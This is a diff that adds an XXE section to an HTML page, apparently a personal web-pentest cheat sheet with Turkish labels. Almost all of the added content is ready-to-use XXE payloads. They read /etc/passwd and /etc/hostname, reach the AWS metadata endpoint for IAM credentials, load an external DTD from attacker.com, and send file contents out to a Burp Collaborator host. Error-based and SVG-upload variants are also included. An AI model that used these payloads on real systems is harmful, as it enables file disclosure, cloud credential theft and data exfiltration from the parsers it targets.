@@ -242,6 +242,131 @@
 
 
 
+<div class="accordion">
+
+    <button class="accordion-header">
+
+        <span>XXE</span>
+
+        <span class="accordion-icon">+</span>
+
+    </button>
+
+    <div class="accordion-content">
+
+        <h2 id="tips">TIPS</h2>
+
+<ul>
+  <li>Normal Entity eklemek</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>&lt;<span class="o">!</span>ENTITY xxe <span class="s2">"testing123"</span><span class="o">&gt;]&gt;</span>
+&lt;<span class="nb">test</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/test&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Dahili dosyaları görüntülemek</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>&lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;]&gt;</span>
+&lt;<span class="nb">test</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/test&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>SSRF</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>&lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"</span><span class="o">&gt;]&gt;</span>
+&lt;<span class="nb">test</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/test&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>&lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"http://localhost/admin"</span><span class="o">&gt;]&gt;</span>
+&lt;<span class="nb">test</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/test&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Kendi sunucuma veya Burp Collaborator’e yönlendirmek</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>&lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"http://BURP-COLLABORATOR-SUBDOMAIN"</span><span class="o">&gt;</span> <span class="o">]&gt;</span>
+&lt;<span class="nb">test</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/test&gt;
+
+</code></pre></div></div>
+
+<ul>
+  <li>General Entity → &amp;xxe;</li>
+  <li>Parameter Entity → %xxe;</li>
+  <li>Parametre Entity eklemek</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE foo <span class="o">[</span>
+    &lt;<span class="o">!</span>ENTITY % xxe SYSTEM <span class="s2">"http://BURP-COLLABORATOR-SUBDOMAIN"</span><span class="o">&gt;</span> %xxe<span class="p">;</span><span class="o">]&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Harici DTD</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>DOCTYPE stockCheck <span class="o">[</span>
+
+&lt;<span class="o">!</span>ENTITY % dtd SYSTEM <span class="s2">"http://attacker.com/exploit.dtd"</span><span class="o">&gt;</span>
+
+%dtd<span class="p">;</span>
+
+<span class="o">]&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>exploit.dtd payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"file:///etc/hostname"</span><span class="o">&gt;</span>
+&lt;<span class="o">!</span>ENTITY % <span class="nb">eval</span> <span class="s2">"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;"</span><span class="o">&gt;</span>
+%eval<span class="p">;</span>
+%exfil<span class="p">;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Error-based exploit.dtd payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"file:///etc/passwd"</span><span class="o">&gt;</span>
+
+&lt;<span class="o">!</span>ENTITY % <span class="nb">eval</span> <span class="s2">"
+&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///invalid/%file;'&gt; → geçersiz dosya yolu
+"</span><span class="o">&gt;</span>
+
+%eval<span class="p">;</span>
+%error<span class="p">;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>XML keşfi</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">productId</span><span class="o">=</span><span class="k">**</span>&lt;<span class="nb">test</span><span class="o">&gt;</span>1&lt;/test&gt;<span class="k">**</span>&amp;storeId<span class="o">=</span>1
+</code></pre></div></div>
+
+<ul>
+  <li>SVG görsel payload</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
+&lt;<span class="o">!</span>DOCTYPE <span class="nb">test</span> <span class="o">[</span>
+    &lt;<span class="o">!</span>ENTITY xxe SYSTEM <span class="s2">"file:///etc/hostname"</span><span class="o">&gt;</span>
+<span class="o">]&gt;</span>
+&lt;svg <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span> <span class="nv">version</span><span class="o">=</span><span class="s2">"1.1"</span><span class="o">&gt;</span>
+    &lt;text <span class="nv">x</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">y</span><span class="o">=</span><span class="s2">"16"</span><span class="o">&gt;</span>&amp;xxe<span class="p">;</span>&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre></div></div>
+
+
+    </div>
+
+</div>
+
+
+
 </div>
 
 <script>
